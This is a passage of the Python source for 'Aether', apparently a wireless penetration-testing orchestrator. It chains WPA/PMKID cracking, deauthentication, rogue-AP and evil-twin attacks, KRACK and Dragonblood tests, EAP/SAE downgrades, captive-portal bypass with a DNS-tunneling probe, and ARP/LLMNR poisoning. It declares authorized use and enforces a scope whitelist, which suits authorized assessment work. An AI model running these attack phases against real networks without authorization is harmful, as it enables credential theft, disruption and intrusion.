                    _sock.getaddrinfo("one.one.one.one", None)
                    result["success"] = True
                    result["detail"] = "DNS resolution succeeded"
                except Exception as e:
                    result["detail"] = str(e)
                finally:
                    _sock.setdefaulttimeout(old_timeout)
            else:
                req = urllib.request.Request(
                    target,
                    headers={"User-Agent": "Mozilla/5.0 (captive-bypass-test)"},
                )
                with urllib.request.urlopen(req, timeout=5) as resp:
                    result["success"] = resp.status < 400
                    result["detail"]  = f"HTTP {resp.status}"
        except Exception as e:
            result["detail"] = str(e)
        bypass_results.append(result)
        log(f"Phase 11c [{test_name}]: {'PASS' if result['success'] else 'FAIL'} — {result['detail']}")

    # DNS tunneling probe (check if we can resolve long subdomains — tunneling indicator)
    try:
        import socket as _sock
        _sock.setdefaulttimeout(3)
        _sock.getaddrinfo("aabbccddaabbccddaabb.probe.example.com", None)
        bypass_results.append({"test": "dns_tunnel_probe", "success": True,
                                "detail": "Long DNS subdomain resolved — tunneling may be possible"})
    except Exception:
        bypass_results.append({"test": "dns_tunnel_probe", "success": False,
                                "detail": "DNS tunneling probe blocked"})

    (cp_dir / "bypass_results.json").write_text(
        json.dumps(bypass_results, indent=2), encoding="utf-8"
    )
    bypasses = [r for r in bypass_results if r["success"]]
    if bypasses:
        finding_from_cat(
            "captive_bypass",
            data={"bypasses": bypasses},
            output_file=str(cp_dir / "bypass_results.json"),
            title_override=f"Captive Portal Bypass Possible: {len(bypasses)} Method(s)",
        )
    status("p11_captive", "Phase 11c: Captive Portal Bypass Testing", "complete")

    status("p11_legacy", "Phase 11: Legacy / Niche Attacks", "complete")

# ── Main orchestrator ─────────────────────────────────────────────────────────

def run(config: dict, project: str) -> None:
    global _scope_bssids, _scope_ssids

    output_dir = Path(project) / config.get("output_dir", "aether_output")
    output_dir.mkdir(parents=True, exist_ok=True)

    interface     = config.get("interface", "wlan0")
    monitor_iface = config.get("monitor_interface", "wlan0mon")
    target_ssids  = config.get("target_ssids", [])
    target_bssids = config.get("target_bssids", [])
    wordlist      = config.get("wordlist")
    domains       = config.get("domains", [])
    phases_cfg    = config.get("phases", {})
    tools         = config.get("tools", {})
    timeout       = config.get("timeout_per_phase", 300)
    scan_channel  = config.get("scan_channel")
    hashcat_rules = config.get("hashcat_rules", [])
    asleap_path   = config.get("asleap_path", "")
    scrape_url         = (config.get("scrape_url") or "").strip()
    scrape_depth       = int(config.get("scrape_depth", 4))
    intel_scan_seconds = int(config.get("intel_scan_seconds", 45))
    deauth_packets     = int(config.get("deauth_packets", 5))
    rogue_cfg          = config.get("rogue_ap", {})
    post_cfg           = config.get("post_connection", {})

    # Scope enforcement
    scope_cfg    = config.get("scope", {})
    _scope_bssids = {b.upper() for b in scope_cfg.get("bssids", [])}
    _scope_ssids  = set(scope_cfg.get("ssids", []))
    if _scope_bssids or _scope_ssids:
        log(f"Scope: {len(_scope_bssids)} BSSID(s), {len(_scope_ssids)} SSID(s) in whitelist")

    client_name  = config.get("client_name", "")
    client_short = config.get("client_short", "")

    log("=" * 60)
    log("AUTHORIZED USE ONLY. Explicit written permission from the")
    log("network owner is required before any wireless assessment.")
    log("=" * 60)
    log(f"Aether Wireless Penetration Testing Orchestrator v{VERSION}")
    if client_name:
        log(f"Client   : {client_name}" + (f" ({client_short})" if client_short else ""))
    log(f"Project  : {project}")
    log(f"Interface: {interface}")
    log(f"Targets  : {', '.join(target_ssids) if target_ssids else '(all in-scope)'}")
    log("=" * 60)

    _check_privileges()
    if not _check_interface(interface):
        err(f"Aborting: interface '{interface}' not available.")
        return

    # Build wordlists before phases start (website scrape → domain derivation → base)
    _effective_wl = wordlist
    if scrape_url:
        _scraped = _build_website_wordlist(scrape_url, scrape_depth, _effective_wl)
        if _scraped:
            log(f"Website wordlist active: {_scraped}")
            _effective_wl = _scraped
    _effective_wl = _build_domain_wordlist(domains, _effective_wl)
    if _effective_wl and _effective_wl != wordlist:
        log(f"Domain wordlist active: {_effective_wl}")

    active_monitor = enable_monitor_mode(interface, monitor_iface)

    try:
        _check_injection(active_monitor)

        # Phase 0-I: Wireless Intelligence — enumerate all APs broadcasting the
        # target SSID, identify connected clients, score and select best target.
        best_ap, enriched_aps = phase_wireless_intel(
            active_monitor, target_ssids, target_bssids, output_dir,
            scan_seconds=intel_scan_seconds,
        )

        # Narrow subsequent phases to the best-scored AP when user has not
        # specified an explicit BSSID — reduces false-positive capture and
        # avoids attacking out-of-scope BSSIDs.
        effective_bssids = list(target_bssids)
        if not effective_bssids and best_ap:
            effective_bssids = [best_ap["bssid"]]
            log(f"Best target selected: {best_ap.get('ssid','')!r} "
                f"[{best_ap['bssid']}] score={best_ap['score']}")

        target_aps = scan_targets(
            active_monitor, target_ssids, effective_bssids,
            timeout=30, channel=scan_channel,
        )

        if phases_cfg.get("wep", True):
            phase_wep(active_monitor, target_aps, output_dir, timeout)

        if phases_cfg.get("pmkid", True):
            phase_pmkid(active_monitor, target_aps, output_dir,
                        timeout=min(timeout, 120), wordlist=_effective_wl,
                        hashcat_rules=hashcat_rules)

        if phases_cfg.get("wpa_handshake", True):
            phase_wifite(
                active_monitor, target_ssids, effective_bssids,
                _effective_wl, output_dir, timeout,
            )

        if phases_cfg.get("deauth_handshake", True):
            phase_deauth_handshake(
                active_monitor, enriched_aps, output_dir,
                _effective_wl, timeout, deauth_packets,
            )

        if phases_cfg.get("wpa_enterprise", False):
            phase_eaphammer(
                active_monitor, target_aps,
                tools.get("eaphammer", "/opt/eaphammer/eaphammer"),
                output_dir,
                auth=config.get("eaphammer", {}).get("auth", "wpa-eap"),
                timeout=timeout,
                asleap_path=asleap_path,
            )

        if phases_cfg.get("dragonblood_sae", True):
            ds_cfg = config.get("dragonslayer", {})
            phase_dragonslayer(
                active_monitor, target_aps,
                tools.get("dragonslayer_client",
                           "/opt/dragonslayer/dragonslayer-client.sh"),
                output_dir,
                attack=ds_cfg.get("attack", 1),
                client_conf=ds_cfg.get("client_conf", ""),
                timeout=timeout,
            )

        if phases_cfg.get("dragonblood_drain", False):
            phase_dragondrain(
                active_monitor, target_aps,
                tools.get("dragondrain",
                           "/opt/dragondrain-and-time/dragondrain"),
                output_dir, timeout=60,
            )

        # Collect any PSKs cracked in earlier phases for use by the rogue AP
        cracked_psks = _collect_cracked_psks(output_dir)

        if phases_cfg.get("rogue_ap", False):
            phase_rogue_ap(
                active_monitor, interface, target_aps, enriched_aps,
                output_dir, rogue_cfg, timeout, cracked_psks,
            )

        if phases_cfg.get("karma", False):
            phase_karma(
                active_monitor, interface, output_dir, rogue_cfg, timeout,
            )

        if phases_cfg.get("client_attacks", True):
            phase_client_attacks(
                active_monitor, target_aps, enriched_aps, output_dir, timeout,
            )

        if phases_cfg.get("eap_downgrade", False):
            phase_eap_downgrade(
                active_monitor, target_aps,
                tools.get("eaphammer", "/opt/eaphammer/eaphammer"),
                output_dir, timeout,
            )

        if phases_cfg.get("sae_downgrade", False):
            phase_sae_downgrade(
                active_monitor, interface, target_aps, enriched_aps,
                output_dir, rogue_cfg, timeout,
            )

        if phases_cfg.get("legacy_attacks", True):
            phase_legacy_attacks(
                active_monitor, target_aps, enriched_aps, output_dir,
                tools, timeout,
            )

        if phases_cfg.get("post_connection", False):
            _ap_iface = (rogue_cfg.get("ap_interface") or "").strip()
            if not _ap_iface:
                _ap_iface = _find_ap_interface([interface, active_monitor])
            phase_post_connection(_ap_iface, output_dir, post_cfg, timeout)

    finally:
        disable_monitor_mode(active_monitor, interface)
        # Clean up domain-derived temp wordlist
        if _effective_wl and _effective_wl != wordlist:
            try:
                os.unlink(_effective_wl)
            except Exception:
                pass

    # KRACK runs after monitor mode is disabled — it needs wlan0 in managed
    # mode; running it while the interface is wlan0mon causes hostapd/scapy
    # to fail with "Interface not found".
    if phases_cfg.get("krack", True):
        phase_krack(
            interface, target_aps,
            tools.get("krackattacks",
                       "/opt/krackattacks-scripts/krackattack/krack-test-client.py"),
            output_dir, timeout=timeout,
        )

    save_findings(output_dir)

    meta = {
        "version": VERSION,
        "project": project,
        "interface": interface,
        "target_ssids": target_ssids,
        "target_bssids": target_bssids,
        "scope": scope_cfg,
        "phases_run": phases_cfg,
        "output_dir": str(output_dir),
        "completed_at": datetime.now().isoformat(),
        "findings_count": len(_findings_collected),
    }
    (output_dir / "assessment_meta.json").write_text(
        json.dumps(meta, indent=2), encoding="utf-8"
    )
    log(f"Assessment complete — output: {output_dir}")
    status("complete", "Assessment Complete", "complete", str(output_dir))


# ── CLI ───────────────────────────────────────────────────────────────────────

def parse_args():
    _default_cfg     = str(Path(__file__).parent / "config.json")
    _default_project = ""  # computed at runtime from config fields

    parser = argparse.ArgumentParser(
        prog="aether",
        description="Aether — Wireless Penetration Testing Orchestrator",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 aether.py --config config.json --project my_pentest
  python3 aether.py --phase pmkid --interface wlan1 --project quick_test
  python3 aether.py --list-phases
""",
    )
    parser.add_argument("--config", "-c", default=_default_cfg,
                        help="JSON config file (default: next to aether.py)")
    parser.add_argument("--project", "-p", default=_default_project,
                        help="Project name / output root directory")
    parser.add_argument("--interface", "-i",
                        help="Wireless interface (overrides config)")
    parser.add_argument("--phase",
                        choices=["wep", "pmkid", "wpa", "enterprise",
                                 "wpa3", "drain", "krack", "rogue",
                                 "karma", "client", "eap-downgrade",
                                 "sae-downgrade", "post", "legacy"],
                        help="Run a single phase only")
    parser.add_argument("--ssid", action="append", dest="ssids", metavar="SSID",
                        help="Target SSID (repeatable; overrides config)")
    parser.add_argument("--bssid", action="append", dest="bssids", metavar="BSSID",
                        help="Target BSSID (repeatable; overrides config)")
    parser.add_argument("--channel", "-C", type=int,
                        help="Lock scan to this channel")
    parser.add_argument("--timeout", "-t", type=int,
                        help="Per-phase timeout seconds")
    parser.add_argument("--wordlist", "-w",
                        help="Wordlist for WPA cracking")
    parser.add_argument("--scope-bssid", action="append", dest="scope_bssids",
                        metavar="BSSID",
                        help="Scope whitelist BSSID (repeatable); attacks blocked outside scope")
    parser.add_argument("--scope-ssid", action="append", dest="scope_ssids",
                        metavar="SSID",
                        help="Scope whitelist SSID (repeatable)")
    parser.add_argument("--domain", action="append", dest="domains",
                        metavar="DOMAIN",
                        help="Domain to deep-parse into wordlist entries (repeatable); "
                             "merged with base wordlist for all password phases")
    parser.add_argument("--rules", action="append", dest="hashcat_rules",
                        metavar="RULE_FILE",
                        help="Hashcat rule file for staged PMKID cracking (repeatable)")
    parser.add_argument("--list-phases", action="store_true",
                        help="List available phases and exit")
    return parser.parse_args()


def _startup_tool_check() -> None:
    """Warn about missing tools at startup. On Linux, exits if the
    core aircrack-ng suite is missing since no phases can run without it."""
    if platform.system() != "Linux":
        return  # macOS support is limited — skip full check
    CRITICAL = ["airmon-ng", "airodump-ng", "aircrack-ng", "aireplay-ng"]
    IMPORTANT = ["hcxdumptool", "hcxpcapngtool", "hashcat", "wash", "asleap",
                 "hostapd", "dnsmasq", "nmap", "responder"]
    missing_critical  = [t for t in CRITICAL  if not shutil.which(t)]
    missing_important = [t for t in IMPORTANT if not shutil.which(t)]
    if missing_critical or missing_important:
        print("[!] Aether startup tool check:", file=sys.stderr)
    for t in missing_critical:
        print(f"    MISSING (critical) : {t}  — install aircrack-ng suite",
              file=sys.stderr)
    for t in missing_important:
        print(f"    MISSING (important): {t}  — run: sudo python3 install.py",
              file=sys.stderr)
    if missing_critical:
        print("[!] Cannot continue without the aircrack-ng suite.\n", file=sys.stderr)
        sys.exit(1)


def main():
    args = parse_args()

    if args.list_phases:
        print("Available phases:")
        print("  wep           — Phase 0:  WEP IV capture + PTW crack         (aircrack-ng)")
        print("  pmkid         — Phase 1a: Clientless PMKID + hashcat          (hcxdumptool)")
        print("  wpa           — Phase 1b: WPA handshake + WPS attacks         (wifite2)")
        print("  enterprise    — Phase 2:  WPA-Enterprise rogue AP + asleap    (EAPHammer)")
        print("  wpa3          — Phase 3:  WPA3 SAE crypto testing             (dragonslayer)")
        print("  drain         — Phase 4:  WPA3 resource exhaustion            (dragondrain)")
        print("  krack         — Phase 5:  WPA2 KRACK testing                 (krackattacks)")
        print("  rogue         — Phase 6a: Rogue AP / Evil Twin + PSK portal   (hostapd+dnsmasq)")
        print("  karma         — Phase 6b: KARMA / MANA probe response         (hostapd-mana)")
        print("  client        — Phase 7:  PMF test + BTM hijack + probe harvest(scapy)")
        print("  eap-downgrade — Phase 8:  EAP downgrade credential capture    (EAPHammer)")
        print("  sae-downgrade — Phase 9:  SAE transition mode downgrade       (hostapd)")
        print("  post          — Phase 10: ARP poison + LLMNR/NBT-NS + portscan(responder+nmap)")
        print("  legacy        — Phase 11: TKIP ChopChop + Wi-Fi Direct + captive bypass")
        sys.exit(0)

    _startup_tool_check()

    config_path = Path(args.config)
    if not config_path.exists():
        print(f"[!] Config not found: {config_path}", file=sys.stderr)
        sys.exit(1)
    try:
        config = json.loads(config_path.read_text(encoding="utf-8"))
    except json.JSONDecodeError as exc:
        print(f"[!] Config parse error: {exc}", file=sys.stderr)
        sys.exit(1)

    # Resolve project directory: CLI arg → absolute; relative → under clients_base;
    # omitted → structured path from config's client_short and start_date fields.
    import re as _re
    if args.project:
        _pp = Path(args.project)
        args.project = str(_pp if _pp.is_absolute() else _clients_base() / _pp)
    else:
        _cs = (config.get("client_short") or "").strip()
        _sd = (config.get("start_date") or "").strip()
        # Use tool-specific name from TOOLS registry if this is a variant (aether-z, etc.)
        _tool_key = os.environ.get("SPECTRE_TOOL_ID", "aether")
        args.project = str(_build_project_dir(_cs, _sd, _tool_key))
    _write_project_meta(
        Path(args.project),
        tool=os.environ.get("SPECTRE_TOOL_ID", "aether"),
        client_name=(config.get("client_name") or ""),
        client_short=(config.get("client_short") or ""),
        year=((config.get("start_date") or "")[:4] or datetime.now().strftime("%Y")),
        version=VERSION,
    )

    global _log_fh
    try:
        _log_fh = open(Path(args.project) / "aether_console.log", "a", encoding="utf-8")
        _log_fh.write(f"# Aether v{VERSION} — {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        _log_fh.flush()
    except Exception:
        _log_fh = None

    if args.interface:
        config["interface"] = args.interface
    if args.ssids:
        config["target_ssids"] = args.ssids
    if args.bssids:
        config["target_bssids"] = args.bssids
    if args.channel is not None:
        config["scan_channel"] = args.channel
    if args.timeout is not None:
        config["timeout_per_phase"] = args.timeout
    if args.wordlist:
        config["wordlist"] = args.wordlist
    if args.scope_bssids:
        config.setdefault("scope", {})["bssids"] = args.scope_bssids
    if args.scope_ssids:
        config.setdefault("scope", {})["ssids"] = args.scope_ssids
    if args.domains:
        config["domains"] = args.domains
    if args.hashcat_rules:
        config["hashcat_rules"] = args.hashcat_rules

    if args.phase:
        _phase_map = {
            "wep":            "wep",
            "pmkid":          "pmkid",
            "wpa":            "wpa_handshake",
            "enterprise":     "wpa_enterprise",
            "wpa3":           "dragonblood_sae",
            "drain":          "dragonblood_drain",
            "krack":          "krack",
            "rogue":          "rogue_ap",
            "karma":          "karma",
            "client":         "client_attacks",
            "eap-downgrade":  "eap_downgrade",
            "sae-downgrade":  "sae_downgrade",
            "post":           "post_connection",
            "legacy":         "legacy_attacks",
        }
        _all_keys = [
            "wep", "pmkid", "wpa_handshake", "wpa_enterprise",
            "dragonblood_sae", "dragonblood_drain", "krack",
            "rogue_ap", "karma", "client_attacks", "eap_downgrade",
            "sae_downgrade", "post_connection", "legacy_attacks",
        ]
        config["phases"] = {k: (k == _phase_map[args.phase]) for k in _all_keys}

    _load_catalogue()
    run(config, args.project)


_load_catalogue()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        log("Assessment interrupted by operator.")
        sys.exit(0)
